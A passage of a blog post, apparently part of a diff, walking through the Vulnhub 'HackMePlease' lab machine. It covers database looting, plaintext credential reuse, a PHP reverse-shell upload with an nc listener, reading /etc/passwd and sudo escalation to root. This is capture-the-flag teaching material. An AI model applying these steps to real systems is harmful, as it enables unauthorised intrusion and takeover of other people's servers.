+</span></span><span class="line"><span class="cl">Type <span class="s1">&#39;help;&#39;</span> or <span class="s1">&#39;\h&#39;</span> <span class="k">for</span> help. Type <span class="s1">&#39;\c&#39;</span> to clear the current input statement.
+</span></span><span class="line"><span class="cl">MySQL <span class="o">[</span>seeddms<span class="o">]</span>&gt; show databases<span class="p">;</span>
+</span></span><span class="line"><span class="cl">+--------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Database           <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+--------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> information_schema <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> mysql              <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> performance_schema <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> seeddms            <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> sys                <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+--------------------+
+</span></span><span class="line"><span class="cl"><span class="m">5</span> rows in <span class="nb">set</span> <span class="o">(</span>0.002 sec<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">MySQL <span class="o">[(</span>none<span class="o">)]</span>&gt; use seeddms<span class="p">;</span>
+</span></span><span class="line"><span class="cl">Reading table information <span class="k">for</span> completion of table and column names
+</span></span><span class="line"><span class="cl">You can turn off this feature to get a quicker startup with -A
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Database changed
+</span></span><span class="line"><span class="cl">MySQL <span class="o">[</span>seeddms<span class="o">]</span>&gt; show tables<span class="p">;</span>
+</span></span><span class="line"><span class="cl">+------------------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Tables_in_seeddms            <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+------------------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tblACLs                      <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tblAttributeDefinitions      <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tblCategory                  <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tblDocumentApproveLog        <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tblDocumentApprovers         <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tblDocumentAttributes        <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tblDocumentCategory          <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tblDocumentContent           <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tblDocumentContentAttributes <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tblDocumentFiles             <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tblDocumentLinks             <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tblDocumentLocks             <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tblDocumentReviewLog         <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tblDocumentReviewers         <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tblDocumentStatus            <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tblDocumentStatusLog         <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tblDocuments                 <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tblEvents                    <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tblFolderAttributes          <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tblFolders                   <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tblGroupMembers              <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tblGroups                    <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tblKeywordCategories         <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tblKeywords                  <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tblMandatoryApprovers        <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tblMandatoryReviewers        <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tblNotify                    <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tblSessions                  <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tblUserImages                <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tblUserPasswordHistory       <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tblUserPasswordRequest       <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tblUsers                     <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tblVersion                   <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tblWorkflowActions           <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tblWorkflowDocumentContent   <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tblWorkflowLog               <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tblWorkflowMandatoryWorkflow <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tblWorkflowStates            <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tblWorkflowTransitionGroups  <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tblWorkflowTransitionUsers   <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tblWorkflowTransitions       <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tblWorkflows                 <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> users                        <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+------------------------------+
+</span></span><span class="line"><span class="cl"><span class="m">43</span> rows in <span class="nb">set</span> <span class="o">(</span>0.003 sec<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can find users in table <code>users</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">MySQL <span class="o">[</span>seeddms<span class="o">]</span>&gt; <span class="k">select</span> * from users<span class="p">;</span>
+</span></span><span class="line"><span class="cl">+-------------+---------------------+--------------------+-----------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Employee_id <span class="p">|</span> Employee_first_name <span class="p">|</span> Employee_last_name <span class="p">|</span> Employee_passwd <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+-------------+---------------------+--------------------+-----------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span>           <span class="m">1</span> <span class="p">|</span> saket               <span class="p">|</span> saurav             <span class="p">|</span> Saket@#<span class="nv">$1337</span>    <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+-------------+---------------------+--------------------+-----------------+
+</span></span><span class="line"><span class="cl"><span class="m">1</span> row in <span class="nb">set</span> <span class="o">(</span>0.003 sec<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>the password is plaintext.</p>
+<p>We can found users in table <code>tblUsers</code>:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141933087.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141933087.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141933087.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141933087.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141933087.png"
+        title="image-20231114193335821" /></p>
+<p>And we can find a <code>admin</code> user and password, try to decrypt the passwd with MD5:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141935802.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141935802.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141935802.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141935802.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141935802.png"
+        title="image-20231114193523530" /></p>
+<p>Failed. Well, we can try to update the passwd of admin:</p>
+<p>![image-20231114193704173](/Users/v4ler1an/Library/Application Support/typora-user-images/image-20231114193704173.png)</p>
+<p>Ok, let us login the website:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141938519.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141938519.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141938519.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141938519.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141938519.png"
+        title="image-20231114193829247" /></p>
+<p>And then, we can use exploit now.</p>
+<h3 id="3-exploit-the-website">3. Exploit the website</h3>
+<p>We upload a php reverse shell to website:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141944910.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141944910.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141944910.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141944910.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141944910.png"
+        title="image-20231114194413643" /></p>
+<p>We need to attention at the file ID:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141945800.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141945800.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141945800.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141945800.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141945800.png"
+        title="image-20231114194542518" /></p>
+<p>Because when we access the shell file, we need to know the id of it:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141949608.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141949608.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141949608.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141949608.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311141949608.png"
+        title="image-20231114194932337" /></p>
+<p>After we upload the file twice, the ID changed to 5.</p>
+<p>And then, we can access the shell through uri <code>/data/1048576/5/shell.php</code>, and listen on kali:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tmp<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ nc -lvp <span class="m">1234</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">1234</span> ...
+</span></span><span class="line"><span class="cl">172.16.86.150: inverse host lookup failed: Unknown host
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>172.16.86.138<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>172.16.86.150<span class="o">]</span> <span class="m">55002</span>
+</span></span><span class="line"><span class="cl">Linux ubuntu 5.8.0-59-generic <span class="c1">#66~20.04.1-Ubuntu SMP Thu Jun 17 11:14:10 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span>
+</span></span><span class="line"><span class="cl"> 03:56:09 up <span class="m">43</span> min,  <span class="m">0</span> users,  load average: 0.74, 0.22, 0.13
+</span></span><span class="line"><span class="cl">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/bin/sh: 0: can<span class="err">&#39;</span>t access tty<span class="p">;</span> job control turned off
+</span></span><span class="line"><span class="cl">$ id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="4-privilege-escalation">4. Privilege Escalation</h2>
+<p>First, turn on the interactive shell with python:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span class="line"><span class="cl">www-data@ubuntu:/$ id
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Look up users:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@ubuntu:/$ cat /etc/passwd
+</span></span><span class="line"><span class="cl">cat /etc/passwd
+</span></span><span class="line"><span class="cl">root:x:0:0:root:/root:/bin/bash
+</span></span><span class="line"><span class="cl">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">bin:x:2:2:bin:/bin:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">sys:x:3:3:sys:/dev:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">sync:x:4:65534:sync:/bin:/bin/sync
+</span></span><span class="line"><span class="cl">games:x:5:60:games:/usr/games:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+</span></span><span class="line"><span class="cl">uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">avahi-autoipd:x:109:116:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">usbmux:x:110:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">rtkit:x:111:117:RealtimeKit,,,:/proc:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">cups-pk-helper:x:113:120:user <span class="k">for</span> cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">speech-dispatcher:x:114:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
+</span></span><span class="line"><span class="cl">avahi:x:115:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">saned:x:117:123::/var/lib/saned:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">nm-openvpn:x:118:124:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">hplip:x:119:7:HPLIP system user,,,:/run/hplip:/bin/false
+</span></span><span class="line"><span class="cl">whoopsie:x:120:125::/nonexistent:/bin/false
+</span></span><span class="line"><span class="cl">colord:x:121:126:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">geoclue:x:122:127::/var/lib/geoclue:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">pulse:x:123:128:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">gnome-initial-setup:x:124:65534::/run/gnome-initial-setup/:/bin/false
+</span></span><span class="line"><span class="cl">gdm:x:125:130:Gnome Display Manager:/var/lib/gdm3:/bin/false
+</span></span><span class="line"><span class="cl">saket:x:1000:1000:Ubuntu_CTF,,,:/home/saket:/bin/bash
+</span></span><span class="line"><span class="cl">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">mysql:x:126:133:MySQL Server,,,:/nonexistent:/bin/false
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Well, we found the user <code>saket</code> which we has seen it in <code>users</code> table. Try to switch to it with password <code>Saket@#$1337</code> and su to root:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">saket@ubuntu:/$ id
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>saket<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>saket<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>saket<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,27<span class="o">(</span>sudo<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,120<span class="o">(</span>lpadmin<span class="o">)</span>,131<span class="o">(</span>lxd<span class="o">)</span>,132<span class="o">(</span>sambashare<span class="o">)</span>
+</span></span><span class="line"><span class="cl">saket@ubuntu:/$ sudo -l
+</span></span><span class="line"><span class="cl">sudo -l
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> saket: Saket@#<span class="nv">$1337</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> saket on ubuntu:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
+</span></span><span class="line"><span class="cl">    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User saket may run the following commands on ubuntu:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL : ALL<span class="o">)</span> ALL
+</span></span><span class="line"><span class="cl">saket@ubuntu:/$ sudo su
+</span></span><span class="line"><span class="cl">sudo su
+</span></span><span class="line"><span class="cl">root@ubuntu:/# id
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</span></span><span class="line"><span class="cl">root@ubuntu:/# ls /root
+</span></span><span class="line"><span class="cl">ls /root
+</span></span><span class="line"><span class="cl">app.apk  Documents  Music     Public  Templates
+</span></span><span class="line"><span class="cl">Desktop  Downloads  Pictures  snap    Videos
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="notes">Notes</h2></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2023-11-11</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="https://www.v4ler1an.com/2023/11/vulnhub_empire_hackmeplease/" data-title="Vulnhub HackMePlease" data-via="@YaoyaoShaw" data-hashtags="Vulnhub"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="https://www.v4ler1an.com/2023/11/vulnhub_empire_hackmeplease/" data-hashtag="Vulnhub"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Hacker News" data-sharer="hackernews" data-url="https://www.v4ler1an.com/2023/11/vulnhub_empire_hackmeplease/" data-title="Vulnhub HackMePlease"><i class="fab fa-hacker-news fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="https://www.v4ler1an.com/2023/11/vulnhub_empire_hackmeplease/" data-title="Vulnhub HackMePlease"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@2.14.0/icons/line.svg"></i></a><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://www.v4ler1an.com/2023/11/vulnhub_empire_hackmeplease/" data-title="Vulnhub HackMePlease"><i class="fab fa-weibo fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/vulnhub/">Vulnhub</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2023/11/vulnhub_empire_lupinone/" class="prev" rel="prev" title="Vulnhub Empire LupinOne"><i class="fas fa-angle-left fa-fw"></i>Vulnhub Empire LupinOne</a>
+            <a href="/2023/11/vulnhub_empire_breakout/" class="next" rel="next" title="Vulnhub Empire Breakout">Vulnhub Empire Breakout<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="disqus_thread" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://disqus.com/?ref_noscript">Disqus</a>.
+            </noscript><div id="valine" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Something just like this.</div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2021 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://www.v4ler1an.com" target="_blank"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
